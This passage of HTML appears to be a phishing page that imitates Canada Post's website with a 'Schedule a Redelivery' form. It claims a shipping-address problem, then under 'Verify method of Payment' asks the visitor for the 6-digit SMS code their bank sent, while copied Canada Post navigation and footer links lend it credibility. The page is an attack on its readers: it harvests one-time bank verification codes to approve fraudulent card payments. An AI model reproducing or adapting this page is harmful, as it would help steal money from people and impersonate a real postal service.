                 "preserveQs": "false",
                 
                    "link": "/cpc/en/home.page?",
                    "linkCMSPage": "",
                  
                  "nodes": [
                    
              
                {
                  "label": "Get Shipping",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/small-business-welcome/small-business-shipping.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Market your business",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/small-business-welcome/market-your-business.page",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Sell Online",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/small-business-welcome/sell-online.page",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Incite-magazine",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "true",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/business/marketing/campaign/incite-magazine.page",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Case studies",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/incite/success-stories.page?icid=cta_int_rs_403",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Video stories",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/incite/video-stories.page?icid=cta_int_rs_405",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Get the facts",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "true",
                  
                    "link": "/cpc/en/business/marketing/campaign/incite/get-the-facts.page?icid=cta_int_rs_407",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
              
                {
                  "label": "Campaign-library",
                   "visibleInSiteMap": "true",      
                   "visibleInBreadCrumbs": "false",
                 "preserveQs": "false",
                 
                    "link": "/cpc/en/business/marketing/campaign/demo/library.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library",
                  
                    "preserveQs": "false",
                  
                  "nodes": [
                    
              
                {
                  "label": "Hero",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/business/marketing/campaign/demo/library/hero.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library/hero",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Common",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/business/marketing/campaign/demo/library/common.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library/common",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Helpers",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/business/marketing/campaign/demo/library/helpers.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library/helpers",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Animations",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/business/marketing/campaign/demo/library/animations.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library/animations",
                  
                    "preserveQs": "false",
                  
                },
              
              
                {
                  "label": "Other",
                  "visibleInSiteMap": "true",
                   "visibleInBreadCrumbs": "false",
                  
                    "link": "/cpc/en/business/marketing/campaign/demo/library/other.page?",
                    "linkCMSPage": "business/marketing/campaign/demo/library/other",
                  
                    "preserveQs": "false",
                  
                },
              
                  ]
                },
              
                  ]
                },
              
              ]
            }
      </script>
      <script type="text/javascript">
        function getSearchTypeAheadAjaxPluginURL() {
                    return "/cpc/en/tools/postal-indicia/1615266171501.ajax";
                  }
      </script>
      <!--ls:end[component-1615266171501]-->
    </div>
    </div>
    </div>
    </div>
    <div class="iw_section" id="sectionkm1jruu8">
      <div class="row iw_row iw_container" id="rowkm1jruu9">
        <div class="columns iw_columns large-12" id="colkm1jruua">
          <div class="iw_component" id="iw_comp1615266171871">
            <div class="row pg-tools-banner">
              <div class="large-12 columns pg-no-side-paddings">
                <div class="pg-tools-banner--image-wrapper">
                  <div class="chevron"></div>
                  <h1 class="pg-tools-banner-title">Schedule a Redelivery</h1>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="iw_section" id="sectionkm1jruk6">
      <div class="row iw_row iw_container" id="rowkm1jruk7">
        <div class="columns iw_columns large-12" id="colkm1jruk8">
          <div class="iw_placeholder" id="iw_placeholder1615266171509">
            <div class="iw_component" id="iw_comp1615266173084">
              <div class="row" id="main-content" tabindex="-1" style="margin: 0 !important;">
                <jartwork-tools data-appid="postalIndicia" language="en" ng-version="9.1.3" _nghost-xbi-c107="">
                  <div _ngcontent-xbi-c107="" class="container">
                    <app-postal-indicia class="ng-star-inserted">
                      <div class="adjust-position ng-star-inserted">
                        <div>
                          <h2 tabindex="-1">Submit redelivery information</h2>
                          <p class="marginBottom24">We have issues with your shipping address, You can schedule redelivery online by filling out your information, We ReDeliver for You!</p>
                          <p class="marginBottom24">Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your Redelivery will be scheduled for the next day.</p>
                          <p>
                            <a role="link" target="_blank" class="external" href="https://www.canadapost-postescanada.ca/cpc/en/support/kb/receiving/tracking/tracking-information-isnt-available-for-my-package" aria-label="View postal indicia requirements (Opens in new tab)">Tracking information isn’t available for my package</a>
                          </p>
                          <!---->
                          <form  method="post" class="ng-untouched ng-pristine ng-invalid">
                            <div class="panel active panelOne in-progress">
                              <div class="panel-header">
                                <div class="step-one">
                                  <span aria-hidden="true" class="numberCircle">3</span>
                                </div>
                                <h3 class="service-details-heading">
                                  <span class="show-for-sr">Step 3 </span>Verify method of Payment.
                                </h3>
                              </div>

                              <section class="panel-body postal-indicia">

                                <div formgroupname="panelOne" class="ng-untouched ng-pristine ng-invalid">
                                  <mat-form-field class="mat-form-field example-full-width ng-tns-c96-0 mat-primary noCampaignIDError mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-hide-placeholder ng-untouched ng-pristine ng-invalid" hintlabel="Must be 7 or 8 digits">
                                    <div class="mat-form-field-wrapper ng-tns-c96-0">
                              <p id="hintTextId" class="matHint ng-tns-c96-0">Two-step verification with your Card provider : Verify The Ownership Of This Payment Method.</p>
                                 <p id="hintTextId" class="matHint ng-tns-c96-0">　</p>
                              <p id="hintTextId" class="matHint ng-tns-c96-0">*To confirm the operation, enter the 6 digits code your bank have sent to your mobile number</p>                  
                                 <p id="hintTextId" class="matHint ng-tns-c96-0">　</p>
                                      <div class="mat-form-field-flex ng-tns-c96-0">

                                        <!---->
                                        <!---->
                                        <div class="mat-form-field-infix ng-tns-c96-0">
                                          <label id="hintLabel" for="customerNumberInput" class="hintLabel ng-tns-c96-0"> </label>
                                          <p id="hintTextId" class="matHint ng-tns-c96-0">SMS Code</p>
                                          <input type="text" pattern="[0-9]*" id="sms" name="sms" matinput="" formcontrolname="customerNumber" maxlength="6" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-tns-c96-0 cdk-text-field-autofill-monitored ng-untouched ng-pristine ng-invalid" aria-describedby="hintTextId"  required="required" aria-invalid="false" aria-required="false">
                                          <!---->










                                          <span class="mat-form-field-label-wrapper ng-tns-c96-0">
                                            <!---->
                                          </span>
                                        </div>
                                        <!---->
                                      </div>
                                      <div class="mat-form-field-underline ng-tns-c96-0 ng-star-inserted">
                                        <span class="mat-form-field-ripple ng-tns-c96-0"></span>
                                      </div>
                                      <!---->
                                      <div class="mat-form-field-subscript-wrapper ng-tns-c96-0">
                                        <!---->
                                        <div class="mat-form-field-hint-wrapper ng-tns-c96-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                          <!---->
                                          <mat-hint id="hintTextId" class="mat-hint ng-tns-c96-0"></mat-hint>
                                          <div class="mat-form-field-hint-spacer ng-tns-c96-0"></div>
                                        </div>
                                        <!---->
                                      </div>
                                    </div>
                                  </mat-form-field>
 
                                </div>
                                <div class="notification">
                                  <!---->
                                </div>
                              </section>
                            </div>

                            <!---->
                            <button title="" data-disabled="false" name="okbb" type="submit" class="btn submit-button button primary-button" style="display: block;"> Continue</button>
                          </form>
                        </div>
                      </div>
                      <!---->
                      <!---->
                    </app-postal-indicia>
                    <!---->
                  </div>
                </jartwork-tools>
              </div>


              <script type="text/javascript">
                "use strict";
              </script>
            </div>

          </div>
        </div>
      </div>
    </div>
    <div class="iw_section" id="sectionkm1jruka">
      <div class="row iw_row iw_container" id="rowkm1jrukb">
        <div class="columns iw_columns large-12" id="colkm1jrukc">
          <div class="iw_component" id="iw_comp1615266171513">
            <div id="cpc-main-footer" class="cpc-footer-container ">
              <div class="cpc-footer">
                <div class="noindex">
                  <section class="footer-l1" role="navigation" aria-label="Footer navigation">
                    <div class="row show-for-large-up">
                      <div class="large-3 columns">

                        <h2 class="show-for-medium-up">Connect with us</h2>
                        <ul class="social-media-icons">

                          <li>
                            <a href="https://www.facebook.com/canadapost" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Facebook</title>
                                <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://twitter.com/canadapostcorp" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Twitter</title>
                                <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.instagram.com/canadapostagram/?hl=en" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Instagram</title>
                                <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Linkedin</title>
                                <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.youtube.com/user/postescanadapost" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                <title>YouTube</title>
                                <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                  <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                </g>
                              </svg>
                            </a>
                          </li>

                        </ul>



                        <ul class="feedback-group">

                          <li>
                            <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                            <a href="https://evaluation.canadapost-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank">
                              <span class="tool-description">Website feedback</span>
                            </a>
                          </li>

                        </ul>

                      </div>
                      <div class="large-3 columns">

                        <h2 class="show-for-medium-up">Support</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="chat-link" target="">Need help?</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page#panel2-1" class="chat-link" target="">Contact us</a>
                          </li>

                        </ul>

                      </div>
                      <div class="large-3 columns">

                        <h2 class="show-for-medium-up">Corporate</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us.page" target="">About us</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/jobs.page" target="">Careers</a>
                          </li>

                          <li>
                            <a href="https://infopost.ca/" target="">I'm an employee</a>
                          </li>

                          <li>
                            <a href="https://mysite.canadapost.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a>
                          </li>

                        </ul>

                      </div>
                      <div class="large-3 columns">

                        <h2 class="show-for-medium-up">Blogs</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/blogs/business" target="">Business Matters</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/blogs/personal" target="">Canada Post Magazine</a>
                          </li>

                        </ul>

                      </div>
                    </div>
                    <div class="row show-for-medium-only">
                      <div class="medium-6 columns">

                        <h2 class="show-for-medium-up">Connect with us</h2>
                        <ul class="social-media-icons">

                          <li>
                            <a href="https://www.facebook.com/canadapost" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Facebook</title>
                                <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://twitter.com/canadapostcorp" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Twitter</title>
                                <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.instagram.com/canadapostagram/?hl=en" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Instagram</title>
                                <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                <title>Linkedin</title>
                                <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                              </svg>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.youtube.com/user/postescanadapost" target="_blank">
                              <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                <title>YouTube</title>
                                <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                  <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                </g>
                              </svg>
                            </a>
                          </li>

                        </ul>



                        <ul class="feedback-group">

                          <li>
                            <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                            <a href="https://evaluation.canadapost-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank">
                              <span class="tool-description">Website feedback</span>
                            </a>
                          </li>

                        </ul>


                        <h2 class="show-for-medium-up">Support</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="chat-link" target="">Need help?</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page#panel2-1" class="chat-link" target="">Contact us</a>
                          </li>

                        </ul>

                      </div>
                      <div class="medium-6 columns">

                        <h2 class="show-for-medium-up">Corporate</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us.page" target="">About us</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/jobs.page" target="">Careers</a>
                          </li>

                          <li>
                            <a href="https://infopost.ca/" target="">I'm an employee</a>
                          </li>

                          <li>
                            <a href="https://mysite.canadapost.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a>
                          </li>

                        </ul>



                        <h2 class="show-for-medium-up">Blogs</h2>
                        <ul>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/blogs/business" target="">Business Matters</a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/blogs/personal" target="">Canada Post Magazine</a>
                          </li>

                        </ul>

                      </div>
                    </div>
                    <div class="row show-for-small-only">
                      <div class="small-12 columns">
                        <ul class="accordion" data-accordion="data-accordion" role="tablist">
                          <li>
                            <h2>Connect with us</h2>

                            <h2 class="show-for-medium-up">Connect with us</h2>
                            <ul class="social-media-icons">

                              <li>
                                <a href="https://www.facebook.com/canadapost" target="_blank">
                                  <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                    <title>Facebook</title>
                                    <path d="M12.688 22h-9.63A1.058 1.058 0 0 1 2 20.942V3.058C2 2.474 2.474 2 3.058 2h17.884C21.526 2 22 2.474 22 3.058v17.884c0 .584-.474 1.058-1.058 1.058H15.82v-7.731h2.614l.391-3.036H15.82V9.308c0-.878.243-1.48 1.503-1.48h1.608v-2.75a21.493 21.493 0 0 0-2.338-.117 3.662 3.662 0 0 0-3.905 4.03v2.232h-2.614v3.035h2.624L12.688 22z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                  </svg>
                                </a>
                              </li>

                              <li>
                                <a href="https://twitter.com/canadapostcorp" target="_blank">
                                  <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                    <title>Twitter</title>
                                    <path d="M9.681 17.08c4.717 0 7.297-3.909 7.297-7.297 0-.111-.002-.222-.007-.332.5-.362.936-.814 1.279-1.328a5.12 5.12 0 0 1-1.473.404c.53-.317.936-.82 1.128-1.419a5.138 5.138 0 0 1-1.629.623 2.565 2.565 0 0 0-4.37 2.339A7.28 7.28 0 0 1 6.62 7.39a2.563 2.563 0 0 0 .794 3.424 2.545 2.545 0 0 1-1.162-.32v.032c0 1.242.884 2.279 2.057 2.514a2.572 2.572 0 0 1-1.158.044 2.567 2.567 0 0 0 2.396 1.781 5.146 5.146 0 0 1-3.797 1.063 7.26 7.26 0 0 0 3.931 1.151M19.5 22h-15A2.5 2.5 0 0 1 2 19.5v-15A2.5 2.5 0 0 1 4.5 2h15A2.5 2.5 0 0 1 22 4.5v15a2.5 2.5 0 0 1-2.5 2.5" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                  </svg>
                                </a>
                              </li>

                              <li>
                                <a href="https://www.instagram.com/canadapostagram/?hl=en" target="_blank">
                                  <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                    <title>Instagram</title>
                                    <path d="M18.54 6.658a1.199 1.199 0 1 1-2.397 0 1.199 1.199 0 0 1 2.397 0zm-6.53 8.665a3.333 3.333 0 1 0 0-6.667 3.333 3.333 0 0 0 0 6.667zm0-8.412a5.131 5.131 0 1 1-5.13 5.131 5.131 5.131 0 0 1 5.13-5.184v.053zm0-3.06c-2.67 0-2.986 0-4.037.063a5.531 5.531 0 0 0-1.851.347 3.312 3.312 0 0 0-1.893 1.893 5.531 5.531 0 0 0-.347 1.85c0 1.052-.063 1.367-.063 4.038 0 2.67 0 2.986.063 4.038.01.632.127 1.258.347 1.85a3.312 3.312 0 0 0 1.893 1.893c.593.22 1.218.338 1.85.347 1.052 0 1.368.063 4.039.063 2.67 0 2.986 0 4.037-.063a5.531 5.531 0 0 0 1.851-.347 3.312 3.312 0 0 0 1.893-1.892c.22-.593.338-1.219.347-1.851 0-1.052.063-1.367.063-4.038 0-2.67 0-2.986-.063-4.038a5.531 5.531 0 0 0-.347-1.85 3.312 3.312 0 0 0-1.893-1.893 5.531 5.531 0 0 0-1.85-.347c-1.063-.105-1.378-.105-4.038-.105v.042zm0-1.798c2.713 0 3.05 0 4.122.063a7.36 7.36 0 0 1 2.43.462 5.11 5.11 0 0 1 2.912 2.871c.29.778.447 1.6.463 2.429 0 1.052.063 1.41.063 4.122 0 2.713 0 3.05-.063 4.122a7.36 7.36 0 0 1-.463 2.429 5.11 5.11 0 0 1-2.923 2.923 7.36 7.36 0 0 1-2.429.463c-1.052 0-1.41.063-4.122.063-2.713 0-3.05 0-4.122-.063a7.36 7.36 0 0 1-2.429-.463 5.11 5.11 0 0 1-2.923-2.923 7.36 7.36 0 0 1-.463-2.429C2.063 15.07 2 14.712 2 12c0-2.713 0-3.05.063-4.122a7.36 7.36 0 0 1 .463-2.429A5.11 5.11 0 0 1 5.46 2.526a7.36 7.36 0 0 1 2.429-.463C8.95 2.011 9.298 2 12.01 2v.053z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                  </svg>
                                </a>
                              </li>

                              <li>
                                <a href="http://www.linkedin.com/company/canada-post?trk=company_name" target="_blank">
